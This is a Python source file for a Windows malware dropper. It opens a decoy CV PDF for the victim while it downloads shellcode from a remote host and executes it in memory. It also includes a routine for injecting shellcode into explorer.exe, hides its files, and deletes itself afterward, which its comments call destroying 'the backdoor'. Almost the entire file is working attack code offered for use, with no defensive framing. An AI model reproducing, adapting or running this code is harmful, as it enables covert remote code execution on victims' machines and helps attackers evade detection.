from os import system, getenv, rmdir, mkdir, unlink, startfile, popen, chdir, getcwd
from os.path import basename
from subprocess import call
from shutil import copyfile
from os.path import isdir, exists
from sys import exit
from time import sleep
from ctypes import *
from urllib2 import urlopen
from threading import Thread


def getPublic():
	return getenv("windir")+"\\..\\Users\\Public\\"

def winHide(file):
	system("attrib +h "+file)
	
def winUnhide(file):
	system("attrib -h "+file)
	
def createDirectory(name):
	path=getPublic()+name
	mkdir(path)
	winHide(path)
	
def createFile(name, buf):
	path=getPublic()+name
	f=open(path, "wb")
	f.write(buf)
	f.close
	winHide(path)
	
def deleteFile(file):
	path=getPublic()+file
	unlink(path)
	
def copyFile(file,name):
	path=getPublic()+file
	cwd=getcwd()+"\\"+name
	copyfile(path,cwd)
	
def removeDirectory(directory):
	path=getPublic()+directory
	rmdir(path)
	
def getPDF(url, dir, name):
	ans=urlopen(url)
	pdf=ans.read()
	createFile(dir+"\\"+name, pdf)
	
def getPidByName(process):
	ps=popen("tasklist").readlines()
	for i in ps:
		if process in i:
			pid=int(i[29:34])
	return pid
	
def runShellcode(shellcode):
	ptr=windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
	windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode)) 
	thread=windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)

def injectShellcode(shellcode, process):
	PAGE_RW = 0x04
	PROCESS_ALL = 0x1F0FFF
	VIRTUAL_MEM = 0x00001000

	kernel32=windll.kernel32
	pid=getPidByName(process)
	scLen = len(shellcode)
	
	h_process=kernel32.OpenProcess(PROCESS_ALL, False, pid)
	if not h_process:
		print "[!] Couldn't get handle to PID: %s" %(pid)
		print "[!] Are you sure %s is a valid PID?" %(pid)
		exit(0)
	
	scAddr=kernel32.VirtualAllocEx(h_process, 0, scLen, VIRTUAL_MEM, PAGE_RW)
	written=c_int(0)
	
	kernel32.WriteProcessMemory(h_process, scAddr, shellcode, scLen, byref(written))
	thread_id=c_ulong(0)
	if not kernel32.CreateRemoteThread(h_process, None, 0, scAddr, 0, 0, byref(thread_id)):
		print "[!] Failed to inject Shellcode, exit..."
		exit(0)

	print "[+] Remote Thread with ID 0x%08x created." %(thread_id.value)
	

def main(dir, name, pdfUrl, shellcode):
	dirfullpath=getPublic()+dir+"\\"
	pdfFullpath=dirfullpath+name
	
	system("attrib +s +h +r +a SolidSnake.exe")
	if isdir(dirfullpath):
		if exists(pdfFullpath):
			startfile(pdfFullpath)
			#startfile(name)
		else:
			getPDF(pdfurl, dir, name)
			startfile(pdfFullpath)
			#startfile(name)
	else:
		createDirectory(dir)
		getPDF(pdfurl, dir, name)
		startfile(pdfFullpath)
		#startfile(name)
	
	runShellcode(shellcode)
	#injectShellcode(shellcode, "explorer.exe")

	# Tricky part :>
	# To copy PDF in place, delete file and delete directory after the PDF is closing by victim
	sleep(5)
	while 1:
		try:
			try:
				copyFile(dir+"\\"+name, name)
				deleteFile(dir+"\\"+name)
			except:
				pass
			try:
				removeDirectory(dir)
				break
			except:
				pass
		except:
			pass
	
	# Destroy the backdoor
	cmd="powershell.exe timeout 5;"+"del "+"SolidSnake.exe"
	call(cmd, shell=false)
	exit(0)
	
	
dir="CV"
name="cv-annexe.pdf"
pdfurl="https://knx2010.files.wordpress.com/2016/11/cv.pdf"


main(dir, name, pdfurl, (urlopen("https://10.4.4.106/sc.txt").read()).decode("string-escape"))
